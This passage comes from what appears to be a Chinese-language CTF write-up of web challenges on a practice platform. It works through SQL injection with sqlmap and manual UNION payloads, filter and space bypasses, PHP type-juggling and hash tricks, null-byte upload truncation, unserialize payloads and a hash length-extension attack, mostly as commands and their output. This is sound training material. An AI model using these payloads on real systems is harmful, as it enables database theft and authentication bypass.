|<br>+——-+<br>注字段名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” –columns –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[2 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| password | varchar(100) |<br>| username | varchar(100) |<br>+———-+————–+<br>直接注密码内容</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” -C “password” –dump –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[1 entry]<br>+———-+<br>| password |<br>+———-+<br>| idnuenna |<br>+———-+<br>直接登录即可获得flag，</p><p>账号 admin 密码 idnuenna<br>获得key</p><p>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</p><h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181759_121.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181800_592.png" alt=""></p><h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a><br>进入之后给了提示,需要满足三个条件</p><ol><li>安装 .NET 9.9</li><li>使用IE浏览器访问</li><li>要在英国<br>根据提示和题目名称呢，可以判断要修改http头</li></ol><p>于是乎构造</p><p>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9<br>Accept-Language: en-gb;</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803181805_551.png" alt=""></p><h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_242.png" alt=""></p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p><p>方法二：<br>输入id=1 and 1=1 显示正常<br>输入id=1 and 1=2 回显错误<br>判断存在SQL注入漏洞（恩）<br>然后判断字段数<br>id=1 order by 1 可以，id=1 order by 2 可以，id=1 order by 3 不行！<br>所以字段数位2<br>id=1 union select 1 错误，id=1 union select 1,2 可以<br>所以字段数位2<br>然后开始爆数据库<br>id=1 union select 1,schema_name from information_schema.schemata</p><p>我们看到爆出了三个库：information_schema、my_db、test</p><p>接下来就是爆my_db的表名(就这个库名比较特别，就它了)<br>id=1 union select 1,table_name from information_schema.tables where table_schema=’my_db’</p><p>在my_db库里面爆出了两个表：news、thiskey<br>对了，thiskey在这里，然后就尝试爆列名</p><p>id=1 union select 1,column_name from information_schema.columns where table_schema=’my_db’</p><p>应该就是k0y了，试试看</p><p>id=1 union select 1,k0y from thiskey</p><h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><pre><code>&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) {  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;){  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website?</code></pre><p>要将hackerDJ进行两次url编码才可满足两个条件</p><p>hackerDJ</p><p>%68%61%63%6B%65%72%44%4A</p><p>%2568%2561%2563%256B%2565%2572%2544%254A<br>提交即可获得flag</p><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181831_78.png" alt=""></p><p>flag: DUTCTF{PHP_is_the_best_program_language}</p><h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181833_337.png" alt=""></p><h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><pre><code>//$_POST[user]意思是读取用户在提交表单时输入的user值，$_POST[PASS]同理//如果二者的值都不为空if($_POST[user] &amp;&amp; $_POST[pass]) {    //连接数据库    $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);    //选择数据库，如果出错，打印错误信息并终止代码运行    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) {        die(&quot;Connection failed: &quot; . mysql_error($conn));} //将用户输入的user值存储到user变量$user = $_POST[user];//将用户输入的pass值，使用md5 hash后，存入pass变量$pass = md5($_POST[pass]);//从表php中查找pw的值//后半句的意思是：只保留user值为$user那一行的查找结果 $sql = &quot;select pw from php where user=&#39;$user&#39;&quot;;//查询语句的运行结果存入变量query之中$query = mysql_query($sql);//如果找不到，报错并终止if (!$query) {    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();}//提取出query的值并以MYSQL_ASSOC格式存放在row之中$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];//如果row[pw]的值存在，且pass的值与row[pw]相同，则返回key//strcasecmp是比较两个值大小，返回：-1,0,1  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;}//否则返回登录失败else {    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  }}</code></pre><p>这里pass的值是 用户提交的密码经过MD5hash之后的值 如果二者相同则拿到 key</p><p>找输入输出</p><p>user一项的输出在php代码中如下： $sql = “select pw from php where user=’$user’”; 看起来并未对输入进行过滤，我们试着打入引号，果然报错，证明注入点可用！</p><p>分析</p><p>此时用工具打表的话，意义不大，因为此题目标已经明晰，我们只要让row[pw]的值与pass经过md5之后的值相等即可。 而$pass经过md5之后的值是我们可以通过正常输入控制的。 同时，row[pw]的值是从$sql提取出来的 因此，目标就一句话：只要我们能够修改$sql的值，此题解决。 再次审视注入点：$sql = “select pw from php where user=’$user’”; 在这里我们可以利用sql语句，直接给$sql返回一个值。 也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决.</p><p>构造</p><p>最终user的框里输入的内容为： ‘AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #</p><p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="http://oy0tigw51.bkt.clouddn.com/201803192336_939.png" alt=""></p><h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803192339_352.png" alt=""></p><p>方法一：</p><pre><code>&lt;?php      $_code = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;      $_code = str_rot13($_code);      $_code = strrev($_code);      $_code = base64_decode($_code);      //echo $_code;      $_ans = &quot;&quot;;      for($x = 0; $x &lt; strlen($_code); $x++) {          $t = substr($_code, $x, 1);          $t1 = ord($t) - 1;          $t = chr($t1);          $_ans = $_ans . $t;      }      $_ans = strrev($_ans);      echo $_ans;  ?&gt;</code></pre><p>方法二：</p><pre><code>&lt;?php$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;$_out=&#39;&#39;;$_in= base64_decode (strrev(str_rot13 ($str)));        for($_start=0;$_start&lt;strlen($_in);$_start++){                $_c=substr($_in,$_start,1);                $__=ord($_c)-1;                $_c=chr($__);                $_out=$_out.$_c;        }    echo strrev($_out);?&gt;</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200104_758.png" alt=""></p><h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a> </p><pre><code>&lt;?phpif (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><p>get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。<br>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，<br>这里可以运用数组绕过，sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE，让两个参数都为数组的形式，就可以FALSE===FALSE，输出flag。当我们传入name[]=1&amp;password[]=2时，会造成<code>sha1(Array) === sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag</p><p>?name[]=1&amp;password[]=2<br>Flag: CTF{t3st_th3_Sha1}</p><h3 id="Guess-Next"><a href="#Guess-Next" class="headerlink" title="Guess Next"></a>Guess Next</h3><p>写个算法没准就算出来了，23333<br>hint：你确定你有认真看判断条件？</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a>  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p><h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a> </p><pre><code>&lt;?phpif (isset ($_GET[&#39;password&#39;])) {    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    {        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    }    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    {        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)        {            die(&#39;Flag: &#39; . $flag);        }        else        {            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        }    }    else    {        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    }}?&gt;</code></pre><p>1.ereg漏洞：首先第一层检查需要绕过ereg漏洞，百度可以知道存在截断的问题，ereg读到%00的时候，就截止了</p><p>2.strlen()限制了长度小于8并且大小必须大于9999999,1e8=100000000 &gt; 9999999</p><p>3.strpos()对password进行匹配，必须含有-，最终才输出flag</p><p>于是构造?password=1e9%00<em>-</em></p><p>Flag: CTF{Ch3ck_anD_Ch3ck}</p><blockquote><p><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/60968595</a></p></blockquote><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>找回密码<br>格式：SimCTF{ }<br>解题链接： <a href="http://ctf5.shiyanbar.com/10/upload/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/upload/</a> </p><p>进入网站step1.php，查看源代码，发现一句<meta name="editor" content="Vim"></p><p>vim编辑，可能存在.xxxx.php.swp的备份文件。尝试了.step1.php.swp、.step2.php.swp，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示you are not an admin，访问.submit.php.swp，果然存在，源码如下</p><pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){    if(strlen($token)!=10) die(&#39;fail&#39;);    if($token!=&#39;0&#39;) die(&#39;fail&#39;);    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;    $r = mysql_query($sql) or die(&#39;db error&#39;);    $r = mysql_fetch_assoc($r);    $r = $r[&#39;num&#39;];    if($r&gt;0){        echo $flag;    }else{        echo &quot;you are not an admin&quot;;    }}</code></pre><p>邮箱为admin的邮箱，要求token长度为10，且token需要等于零。</p><p>邮箱在step1.php中有提到<meta name="admin" content="admin@simplexue.com"></p><p>token验证可以用php中的0exxxxxxxx绕过。</p><p>payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111</p><p>flag：SimCTF{huachuan_TdsWX}</p><h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p><p>username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。</p><pre><code>$unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) {    print_r($flag); }</code></pre><p>这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，bool类型的true跟任意字符串可以弱类型相等<br>因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>payload:post：a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p><p>flag:ctf{dwduwkhduw5465}</p><h3 id="Forms-1"><a href="#Forms-1" class="headerlink" title="Forms"></a>Forms</h3><p>查看网页源代码。</p><pre><code>&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;</code></pre><p>将type中的hidden去掉，并赋值value=1，提交，就能看到源代码了。</p><pre><code>$a = $_POST[&quot;PIN&quot;];if ($a == -19827747736161128312837161661727773716166727272616149001823847) {    echo &quot;Congratulations! The flag is $flag&quot;;} else {    echo &quot;User with provided PIN not found.&quot;; }</code></pre><p>让a等于对应的数字，就能得到flag。</p><p>flag：ctf{forms_are_easy}</p><h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。</p><p>URL重写，其实就是把带一大堆参数的url，变成一个看上去很规矩的url,主要目的是为了搜索引擎。</p><h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201255_194.png" alt=""></p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。</p><pre><code>hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin</code></pre><p>输出结果</p><pre><code>e18dfd8404515016d3aeeea2aa196909admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre><p>将\x换成%并填入对应位置。<br>hash2</p><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p>打开网页，查看源代码，获得提示<!-- please post what you find with parameter:key -->，让我们post参数key。</p><p>抓包发现header头中有经过base64编码的flag参数，<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p><pre><code>import requests,refrom base64 import b64decodes = requests.Session()url = &#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;r = s.get(url)head = r.headersflag = b64decode(head[&#39;flag&#39;]).split(&#39;:&#39;)[1]r1 = s.post(url, data={&#39;key&#39;:flag})print r1.text</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201347_373.png" alt=""></p><blockquote><p>过滤空格方法</p><ol><li>注释/<strong>/绕过空格     select user() from d     变成`select/</strong>/user()/<strong>/from/</strong>/`</li><li>括号绕过空格     select user() from dual where 1=1 and 2=2     变成     select(user())from dual where(1=1)and(2=2)</li><li>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</li></ol></blockquote><pre><code>对页面输入下面的测试项测试过滤规则测试项    输入    是否过滤逗号    ,&#39;    否注释符#    #&#39;    是注释符 --    --&#39;    是注释符/**/    /**/&#39;    否updatexml函数    updatexml &#39;    否select    select&#39;    否select    select &#39;    是select    select/**/&#39;    否select    /*!select*/    否or    or&#39;    否and    and&#39;    否concat    concat &#39;    否group_concat    group_concat&#39;    是group_concat    /*groupt_concat*/&#39;    是group_concat    groupgroup_concat_concat&#39;    否</code></pre><p>3.判断有那些数据库：</p><pre><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201407_844.png" alt=""></p><ol><li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li></ol><p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201422_573.png" alt=""><br>payload</p><pre><code>http://ctf5.shiyanbar.com/web/index_2.php/?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201437_337.png" alt=""></p><h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>注库名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&quot; --dbs</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201444_689.png" alt=""></p><p>当前数据库<br>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php/?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php/?id=1</a>“ –current-db</p><p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201453_629.png" alt=""></p><p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201517_635.png" alt=""></p><p>flag{Y0u_@r3_5O_dAmn_90Od}</p><h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/pcat/source.txt</a></p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {  echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){           print &quot;水可载舟，亦可赛艇！&quot;;        exit();    }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){  die(&#39;Could not connect: &#39; . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print &quot;CTF{XXXXXX}&quot;;    }else{        print &quot;亦可赛艇！&quot;;    }}else{  print &quot;一颗赛艇！&quot;;}mysql_close($con);?&gt;</code></pre><p>注意过滤了这些关键字</p><pre><code>$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</code></pre><p>要输出flag就要满足<code>mysql_num_rows($query) == 1、$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>这两个条件。</p><p>mysql_num_rows()函数返回结果集中行的数目。我们构造uname让sql语句查询出来的结果是一行就能绕过。Uname = ‘or 1 limit 1#，这样sql语句就是SELECT * FROM interest WHERE uname = ‘’or 1 limit 1#，这样就查询1行，也就能绕过第一个条件。<br>从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。</p><p>第二个条件是让查询的pwd的值等于输入的值，此处用的是 ==，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，<br>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2 （从第二行开始查询）#注释<br>此时密码只要为空即可查询成功</p><p>payload:uname=’or 1 group by pwd with rollup limit 1 OFFSET 2#</p><p>flag：CTF{with_rollup_interesting}</p><h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>自己没做出来<br>别人的wp三种方法：<br><a href="https://www.jianshu.com/p/5d34b3722128" target="_blank" rel="external">https://www.jianshu.com/p/5d34b3722128</a></p><h3 id="登录一下好吗？？"><a href="#登录一下好吗？？" class="headerlink" title="登录一下好吗？？"></a>登录一下好吗？？</h3><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a></p><p>在用户名表单里提交一系列字段可以发现题目过滤了几乎所有查询语句，注释，但是没有过滤’，这里的绕过比较巧妙，由于=是从左到到运算的，所以可以人为构造0=0的结果，payload为username=1’=’&amp;password=1’=’，拼接后的语句为:</p><pre><code>select * from user where username=&#39;1&#39;=&#39;&#39; and 